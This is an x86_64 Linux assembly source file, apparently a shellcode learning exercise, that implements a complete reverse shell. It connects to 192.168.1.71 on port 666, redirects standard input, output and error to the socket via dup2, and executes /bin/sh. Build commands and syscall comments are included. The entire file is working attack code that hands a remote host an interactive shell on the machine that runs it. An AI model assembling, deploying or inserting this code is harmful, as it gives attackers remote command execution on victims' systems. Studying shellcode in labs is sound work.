;nasm -f elf64 reverse_shell.asm && ld reverse_shell.o -o rev_shell
;Simple Reverse Shell (x86_64) 64 BITS
;syscall list (/usr/include/asm/unistd_64.h)
;socketcall number (/usr/include/linux/net.h)
;Author : Unam3dd

BITS 64

section .text

global _start

_start:
        jmp _init_socket ; Init Socket


_init_socket:
    xor rdx, rdx ; Flags = 0 (xor rdx, rdx = mov rdx, 0x0)
    mov rsi, 1  ; SOCK_STREAM = 1 in (/usr/include/linux/net.h)
    ;push 1
    ;pop rsi
    mov rdi, 2  ; AF_INET = PF_INET = 2 in (/usr/include/x86_64-linux-gnu/bits/socket.h or locate bits/socket.h)
    mov rax, 41 ; socket syscall
    syscall; int 0x80 kernel interuption
    jmp _struct_sockaddr_in

_struct_sockaddr_in:
    ;struct sockaddr_in
    push 0x4701a8c0 ; push the address in Network Byte Order (192.168.1.71)
    mov bx,0x9a02 ; push to short network byte order 666
    push bx
    mov bx, 0x2 ; Push AF_INET = 2
    push bx
    jmp _connect

_connect:
    mov rsi, rsp ; save address of our struct lets etablish the connection
    mov rdx, 0x10 ; size of the struct
    mov rdi, rax ; socket file descriptor
    push rax ; call connect syscall
    mov rax, 42 ; Make the Connection
    syscall
    jmp dup_fd

dup_fd:
    pop rdi
    mov rsi, 2
    mov rax, 33
    syscall ; sys_dup2(socket_fd,2)

    dec rsi
    mov rax, 33
    syscall ; sys_dup2(socket_fd,1)

    dec rsi
    mov rax, 33
    syscall ; sys_dup2(socket_fd,0)

    mov r8, 0x68732f6e69622f2f ; //bin/sh in little endian
    shr r8, 0x8;
    push r8
    mov rdi,rsp
    xor rdx, rdx
    push rdx
    push rdi

    mov rsi,rsp
    mov rax, 59
    syscall
    jmp _exit


_exit:
    xor rdi, rdi ; NULL exit status (xor rdi,rdi | mov rdi,0x0)
    mov rax, 60 ; exit syscall
    syscall ; int 0x80
